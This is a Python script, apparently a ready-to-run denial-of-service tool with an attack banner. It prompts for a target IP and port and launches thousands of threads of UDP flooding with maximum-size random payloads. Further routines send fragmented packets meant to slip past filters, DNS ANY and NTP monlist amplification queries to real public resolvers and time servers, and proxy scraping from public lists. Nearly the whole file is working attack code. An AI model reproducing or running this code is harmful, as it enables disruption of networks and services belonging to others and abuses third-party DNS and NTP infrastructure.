
import socket
import threading
import random
import time
import os
import sys
import struct

# ================== CONFIG ==================
TARGET_IP = ""
TARGET_PORT = 0
THREADS = 5000
PACKET_SIZE = 65507  # Max UDP payload
COUNTER = 0
RUNNING = True
LOCK = threading.Lock()
PROXY_LIST = []

# ================== COLORS ==================
R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; W = '\033[97m'; RESET = '\033[0m'
BOLD = '\033[1m'

# ================== BANNER ==================
BANNER = f"""
{R}{BOLD}
╔══════════════════════════════════════════════════════════╗
║   ██╗   ██╗██████╗ ██████╗       ██████╗ ██████╗███████╗ ║
║   ██║   ██║██╔══██╗██╔══██╗     ██╔════╝ ██╔══██╗██╔════╝ ║
║   ██║   ██║██║  ██║██████╔╝     ██║  ███╗██████╔╝███████╗ ║
║   ██║   ██║██║  ██║██╔═══╝      ██║   ██║██╔══██╗╚════██║ ║
║   ╚██████╔╝██████╔╝██║          ╚██████╔╝██████╔╝███████║ ║
║    ╚═════╝ ╚═════╝ ╚═╝           ╚═════╝ ╚═════╝ ╚══════╝ ║
║                                                          ║
║   {W}v1.0 {R}- {C}Maximum Power UDP Flood{R}                        ║
║   {Y}Raw Sockets | Multi-Vector | Proxy Rotation (TCP){R}         ║
╚══════════════════════════════════════════════════════════╝
{RESET}
"""

# ================== PROXY SCRAPER ==================
def scrape_proxies():
    """Scrape free proxies - only for TCP/HTTP"""
    global PROXY_LIST
    print(f"\n{C}[*] Scraping proxies (TCP/HTTP only)...{RESET}")
    
    try:
        import requests
    except:
        os.system("pip install requests")
        import requests
    
    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    ]
    
    for url in sources:
        try:
            r = requests.get(url, timeout=10)
            for p in r.text.strip().split('\n'):
                p = p.strip()
                if p and ':' in p and len(p) < 25:
                    PROXY_LIST.append(p)
            print(f"{G}[+] {url.split('/')[-1]}: {len(r.text.strip().split(chr(10)))} proxies{RESET}")
        except Exception as e:
            print(f"{R}[-] Failed: {url.split('/')[-1]}{RESET}")
    
    PROXY_LIST = list(set(PROXY_LIST))
    print(f"{G}[✓] Total unique: {len(PROXY_LIST)}{RESET}\n")
    
    with open("proxies_udp.txt", "w") as f:
        f.write("\n".join(PROXY_LIST))

# ================== UDP FLOOD (DIRECT - NO PROXY) ==================
def udp_flood_direct():
    """Pure UDP flood - max speed - no proxy"""
    global COUNTER
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 16)
    
    # Pre-generate payloads
    payloads = [random._urandom(PACKET_SIZE) for _ in range(20)]
    
    while RUNNING:
        try:
            sock.sendto(random.choice(payloads), (TARGET_IP, TARGET_PORT))
            with LOCK:
                COUNTER += 1
        except:
            pass

# ================== UDP FRAGMENT FLOOD ==================
def udp_fragment_flood():
    """Send fragmented UDP packets - can bypass some filters"""
    global COUNTER
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
            # Send smaller fragmented packets
            for _ in range(10):
                s.sendto(random._urandom(random.randint(1, 1400)), (TARGET_IP, TARGET_PORT))
                with LOCK:
                    COUNTER += 1
            s.close()
        except:
            pass

# ================== DNS AMPLIFICATION ==================
def dns_amplification():
    """DNS ANY query amplification - requires spoofing for real effect"""
    global COUNTER
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
        "208.67.222.222", "208.67.220.220", "64.6.64.6",
    ]
    
    # DNS ANY query for max response size
    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
            b'\x03www\x07example\x03com\x00\x00\xff\x00\x01'
    
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for dns in dns_servers:
                s.sendto(query, (dns, 53))
                with LOCK:
                    COUNTER += 1
            s.close()
        except:
            pass

# ================== NTP AMPLIFICATION ==================
def ntp_amplification():
    """NTP monlist amplification"""
    global COUNTER
    ntp_servers = [
        "pool.ntp.org", "time.google.com", "time.cloudflare.com",
    ]
    
    # NTP monlist request packet
    ntp_packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for ntp in ntp_servers:
                try:
                    s.sendto(ntp_packet, (socket.gethostbyname(ntp), 123))
                    with LOCK:
                        COUNTER += 1
                except:
                    pass
            s.close()
        except:
            pass

# ================== STATS ==================
def stats_monitor():
    global COUNTER
    last = 0
    start_time = time.time()
    while RUNNING:
        time.sleep(1)
        with LOCK:
            cur = COUNTER
        pps = cur - last
        last = cur
        mbps = (pps * PACKET_SIZE * 8) / (1024 * 1024)
        elapsed = int(time.time() - start_time)
        
        sys.stdout.write(
            f"\r{Y}[⚡] PPS: {W}{pps:,} {Y}| "
            f"MBPS: {W}{mbps:.2f} {Y}| "
            f"Total: {W}{cur:,} {Y}| "
            f"Time: {W}{elapsed}s{RESET}    "
        )
        sys.stdout.flush()

# ================== MAIN ==================
def main():
    global TARGET_IP, TARGET_PORT, THREADS, RUNNING
    
    os.system('clear')
    print(BANNER)
    
    print(f"{C}{BOLD}[CONFIGURATION]{RESET}")
    
    # Target IP
    TARGET_IP = input(f"{G}[?] Target IP: {W}").strip()
    if not TARGET_IP:
        print(f"{R}[!] No target. Exiting.{RESET}")
        sys.exit()
    
    # Port
    port_input = input(f"{G}[?] Port (443): {W}").strip()
    TARGET_PORT = int(port_input) if port_input else 443
    
    # Threads
    th_input = input(f"{G}[?] Threads (5000): {W}").strip()
    THREADS = int(th_input) if th_input else 5000
    
    # Attack mode
    print(f"\n{C}{BOLD}[ATTACK MODE]{RESET}")
    print(f"  {Y}[1]{W} UDP Direct (Fastest)")
    print(f"  {Y}[2]{W} UDP + Fragment")
    print(f"  {Y}[3]{W} UDP + DNS Amp")
    print(f"  {Y}[4]{W} UDP + NTP Amp")
    print(f"  {Y}[5]{W} ALL METHODS (Maximum)")
    method = input(f"{G}[?] Method (5): {W}").strip() or "5"
    
    # Proxy?
    use_proxy = input(f"{G}[?] Load proxies? (y/n): {W}").strip().lower() == 'y'
    
    if use_proxy:
        scrape_proxies()
        print(f"{Y}[!] UDP flood ignores proxies - they only work for TCP/HTTP{RESET}")
    
    # Launch
    print(f"\n{R}{BOLD}[🔥] LAUNCHING ATTACK{RESET}")
    print(f"{W}Target: {R}{TARGET_IP}:{TARGET_PORT}{RESET}")
    print(f"{W}Threads: {R}{THREADS}{RESET}")
    print(f"{W}Method: {R}{method}{RESET}")
    print(f"\n{Y}Press Ctrl+C to stop{RESET}\n")
    
    time.sleep(2)
    
    # Start stats
    threading.Thread(target=stats_monitor, daemon=True).start()
    
    # Launch threads
    methods = []
    if method == "1":
        methods = [udp_flood_direct]
    elif method == "2":
        methods = [udp_flood_direct, udp_fragment_flood]
    elif method == "3":
        methods = [udp_flood_direct, dns_amplification]
    elif method == "4":
        methods = [udp_flood_direct, ntp_amplification]
    else:
        methods = [udp_flood_direct, udp_fragment_flood, 
                   dns_amplification, ntp_amplification]
    
    threads_per = THREADS // len(methods)
    
    for m in methods:
        for _ in range(threads_per):
            t = threading.Thread(target=m, daemon=True)
            t.start()
        print(f"{G}[+] Launched {threads_per} threads: {m.__name__}{RESET}")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        RUNNING = False
        print(f"\n\n{R}[!] Attack stopped{RESET}")
        print(f"{Y}[📊] Total packets: {COUNTER:,}{RESET}")
        total_mb = (COUNTER * PACKET_SIZE) / (1024 * 1024)
        print(f"{Y}[📊] Total data: {total_mb:.2f} MB{RESET}")
        sys.exit()

if __name__ == "__main__":
    try:
        import requests
    except:
        os.system("pip install requests")
    main()
